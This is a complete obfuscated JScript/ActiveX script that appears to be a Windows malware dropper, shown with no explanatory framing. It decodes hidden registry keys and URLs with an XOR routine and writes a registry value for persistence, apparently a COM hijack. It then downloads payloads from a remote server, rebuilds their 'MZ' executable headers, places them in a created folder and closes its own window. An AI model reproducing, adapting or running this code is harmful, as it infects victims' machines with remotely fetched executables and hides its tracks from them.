
var wshell = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");
var total = "";

TPEZP();

function TPEZP()
{
    MISSION();
    window.close();
};

function CLEAN(p)
{
   return p.replace(/^\s+|\s+$/gm,'');
};

function MKDIR() 
{
    var path = "BDASPRK#78RWHFE=J:ZLOMPMVYZSC:pS~|?szLkkqvlx^Coovs~|vkqp[?k~C~vRm|lpypCkvH{qhpClzRv{?~vYzsCl.i/1??????????????????????????????????????????????????????????????????";
    path = path.substring(16,path.length-1);
    path = STRENC(path);
    path = CLEAN(path);
    path = wshell.ExpandEnvironmentStrings(path);
    var token = path.split("\\");
    var tpath = ""; 

    for(var i=0; i<token.length; i++) 
    {
        if(tpath == "")
            tpath = token[i];
        else
            tpath = tpath + "\\" + token[i];

        if(!fso.FolderExists(tpath))
            fso.CreateFolder(tpath);
    }
    return path;
};

function STRENC(strText)
{
    var len = 0; 
    var temp;
    var i = 0;
    var x = '';
    var strArr = new Array();
    
    len = strText.length;

    for (i = 0; i<len; i++)
        strArr[i] = strText.charCodeAt(i);

    for(i=0; i<len; i++)
    {
        strArr[i] = strArr[i] ^ 31;
    }

    for(i=0; i<len-1; i=i+2)
    {
        temp = strArr[i];
        strArr[i] = strArr[i+1];
        strArr[i+1] = temp;
    }

    for(i=0; i<len; i++)
        x += String.fromCharCode(strArr[i]);

    return x;
};

function GETVER()
{
    var str1 = "TWRSLCYPHKM^CZVRM\\LPYPCKVH[QHP?LKQ\\CMJZMKQZILMPVCQj\\mmqzIkmzvlqp";
    var str2 = "TWRSLCLFZKCRj\\mmqz\\kqpmkspzLCkp\\kqpmCszLllpv?q~R~qzxCmqZvipmrqqzCkMO\\PLZPL@MM^W\\KV\\ZJKZM";
    str1 = STRENC(str1);
    str2 = STRENC(str2);
    var x = wshell.RegRead(str1);
    var y = wshell.RegRead(str2);
    if(x < 6.0)
        return 532;
    else if(y == "x86")
        return 632;
    else
        return 664;
};

function GETCHK(x,f1,f2,path)
{    
    var dst = "";
    if((x==532)||(x==632))
        dst = path + "\\" + CLEAN(f1);
    else
        dst = path + "\\" + CLEAN(f2);

    return fso.FileExists(dst);
};

function SETREG(x,f1,f2,path)
{
    var k50 = "TWJ\\LCyphkm~Czs\\l~zlClS\\VLC[(d//~(||2y-,-/.2{.2.~~-{/2'/*/|y-./(bzVCOqpmL|mzzi,mC-";
    var k60 = "TWJ\\LCyphkm~Czs\\l~zlClS\\VLC[~d{/./z'2z..//+2',2&}~+++2+)~y/y./'-b'VCOqpmL|mzzi,mC-";
    k50 = STRENC(k50);
    k60 = STRENC(k60);
    
    if(x==532)
    {
        val = path + "\\" + CLEAN(f1) + ".";
        key = k50;
    }
    else if(x==632)
    {
        val = path + "\\" + CLEAN(f1) + ".";
        key = k60;
    }
    else if(x==664)
    {
        val = path + "\\" + CLEAN(f2) + ".";
        key = k60;
    }
    wshell.RegWrite(key, val, "REG_SZ");
};

function MISSION()
{
    var tempdir = "J:ZLOMPMVYZSC:pS~|?szLkkqvlx^Coovs~|vkqp[?k~C~vRm|lpypCkvH{qhpl";
    var temp = "HC}zs\\l~1l~}t";
    var doc = window.document;
    tempdir = STRENC(tempdir);
    tempdir = wshell.ExpandEnvironmentStrings(tempdir);
    temp = STRENC(temp);
    temp = tempdir + temp;

    try
    { 
        var names1 = "4ADFL43R#$478GH=l|~|vo{1k~???????????????????????????????????????????????????";
        var names2 = "93E093KLIWOQAKV=l|~|vo-,{1k~?????????????????????????????????????????????????";
        var namek1 = "78EREPW[QEIRIOE=kqwljm1v~{?k?????????????????????????????????????????????????";
        var namek2 = "9342LHGKDUIROOW=kqwljm,v1-~{?k???????????????????????????????????????????????";
        names1 = names1.substring(16,names1.length-1);
        names1 = STRENC(names1);
        names1 = CLEAN(names1);
        names2 = names2.substring(16,names2.length-1);
        names2 = STRENC(names2);
        names2 = CLEAN(names2);
        namek1 = namek1.substring(16,namek1.length-1);
        namek1 = STRENC(namek1);
        namek1 = CLEAN(namek1);
        namek2 = namek2.substring(16,namek2.length-1);
        namek2 = STRENC(namek2);
        namek2 = CLEAN(namek2);
        var key = "";
        var val = "";
        var dir = MKDIR();
        var ver = GETVER();

        if(fso.FileExists(temp))
            fso.DeleteFile(temp);

        if(GETCHK(ver,names1,names2,dir) == 0)
        {
            SETREG(ver,names1,names2,dir);

            if(!fso.FileExists(temp))
            {
                GETDOWN(ver,temp,101);

                if(CHKFILE(temp) == 1)
                {
                    total = ver + "$\\!@" + temp + "$\\!@" + dir + "$\\!@" + names1 + "$\\!@" + names2;
                    GETFILE(101);
                }
                else
                {
                    if(fso.FileExists(temp))
                        fso.DeleteFile(temp);
                }
            }
        }

        if(fso.FileExists(temp))
            fso.DeleteFile(temp);

        if(GETCHK(ver,namek1,namek2,dir) == 0)
        {
            if(!fso.FileExists(temp))
            {
                GETDOWN(ver,temp,102);

                if(CHKFILE(temp) == 1)
                {
                    total = ver + "$\\!@" + temp + "$\\!@" + dir + "$\\!@" + namek1 + "$\\!@" + namek2;
                    GETFILE(102);
                }
                else
                {
                    if(fso.FileExists(temp))
                        fso.DeleteFile(temp);
                }
            }
        }
            
    }
    catch(e)
    {
        if(fso.FileExists(temp))
            fso.DeleteFile(temp);
        window.close();
    }
};

function CHKFILE(src)
{
    var i=0;
    var buffer;
    var fobj=fso.GetFile(src);
    var size=fobj.size-2;
    if(size < 5000)
        return 0;
    ts=fobj.OpenAsTextStream(1,-1);
    buffer = ts.Read(4);
    ts.Close();

    var str = "";
    var len = "";
    var c = buffer.charCodeAt(3);
    str = c.toString(16);
    len = str;
    c = buffer.charCodeAt(2);
    str = c.toString(16);
    if(str.length == 3)
        str = "0" + str;
    len = len + str;
    str = parseInt(len, 16);
    if(size == str)
        return 1
    return 0;
};

function GETFILE(chk)
{
    var token = total.split("$\\!@");
    var x = token[0];
    var src = token[1];
    var path = token[2];
    var name1 = token[3];
    var name2 = token[4];
    var dst = "";
    var check = chk;
    if((x==532)||(x==632))
        dst = path + "\\" + name1;
    else
        dst = path + "\\" + name2;

    COPYFILE(src,dst,check);

    if(fso.FileExists(src))
        fso.DeleteFile(src);
};

function COPYFILE(src,dst,chk)
{
    var buffer = [];
    var i = 0, j = 0;
    var dst2 = "";

    if(chk == 101)
        dst2 = dst;
    else
        dst2 = dst + "vobj";

    var fobj=fso.GetFile(src);
    ts=fobj.OpenAsTextStream(1,-1);

    while(!ts.AtEndOfStream)
        buffer[i++]=ts.Read(1);
    ts.Close();

    f = fso.CreateTextFile(dst2, true);
    if(chk == 101)
    {
        f.Write("M");
        f.Write("Z");
    }
    else
    {
        f.Write("T");
        f.Write("I");
    }
    f.Close();

    var fobj2 = fso.GetFile(dst2);
    ts=fobj2.OpenAsTextStream(8,-1);

    j = 33;
    while(j<buffer.length)
    {
        ts.Write(buffer[j++]);
    }
    ts.Close();
};

function GETOBJ()
{
    var str1 = "LRG";
    str1 = STRENC(str1);
    var str2 = "SR1-";
    str2 = STRENC(str2);
    var str3 = "ZLM";
    str3 = STRENC(str3);
    var str4 = "ZIM";
    str4 = STRENC(str4);
    var str5 = "RGWS";
    str5 = STRENC(str5);
    var str6 = "KKO";
    str6 = STRENC(str6);
    var str7 = ")1/1";
    str7 = STRENC(str7);
    var obj;
    try
    {
        var str = str1 + str2 + str5 + str6 + str7;
        obj = new ActiveXObject(str);
    }
    catch(e)
    {
        var str = str1 + str2 + str3 + str4 + str5 + str6;
        obj = new ActiveXObject(str);
    }
    return obj;
};

function WRITETXT(path,data)
{
    var file = fso.CreateTextFile(path);
    file.Write("TI");
    file.Close();
    file = fso.GetFile(path);
    var stream = file.OpenAsTextStream(8,-1);
    stream.Write(data);
    stream.Close();
};

function GETDOWN(x,path,n) 
{
    var ret = 0;
    var u1 = "potro*$krto4369=kwok%l00~m1hvxwk}jljmzp|kqqz1kp|0rl|zkkl.,.,~0|}r0l~zk0mzljk/o./~0-,}1or??????????????????????????????????????????????????????????";
    var u2 = "erowuto#@*dfg9k=kwok%l00~m1hvxwk}jljmzp|kqqz1kp|0rl|zkkl.,.,~0|}r0l~zk0mzljk/o./~0+)}1or??????????????????????????????????????????????????????????";
    var v1 = "xokqep98;ieoeow=kwok%l00~m1hvxwk}jljmzp|kqqz1kp|0rl|zkkl.,.,~0|}r0l~zk0mzljk/o./}0-,}1or??????????????????????????????????????????????????????????";
    var v2 = "pppow34&dfgowep=kwok%l00~m1hvxwk}jljmzp|kqqz1kp|0rl|zkkl.,.,~0|}r0l~zk0mzljk/o./}0+)}1or??????????????????????????????????????????????????????????";
    u1 = u1.substring(16,u1.length-1);
    u1 = STRENC(u1);
    u1 = CLEAN(u1);
    u2 = u2.substring(16,u2.length-1);
    u2 = STRENC(u2);
    u2 = CLEAN(u2);
    v1 = v1.substring(16,v1.length-1);
    v1 = STRENC(v1);
    v1 = CLEAN(v1);
    v2 = v2.substring(16,v2.length-1);
    v2 = STRENC(v2);
    v2 = CLEAN(v2);

    if(n == 101)
    {
        if((x==532)||(x==632))
            url = u1;
        else
            url = u2;
    }
    else
    {
        if((x==532)||(x==632))
            url = v1;
        else
            url = v2;
    }
        
    url = CLEAN(url);
    
    try
    {
        var obj = GETOBJ();
        obj.open("GET", url, false);
        obj.send();

        if (obj.status == 200) 
        {
            var data = obj.ResponseBody;
            WRITETXT(path, data);
            ret = 1;
        }
    }
    catch(e)
    {
        ret = 0;
    }

    return ret;
};





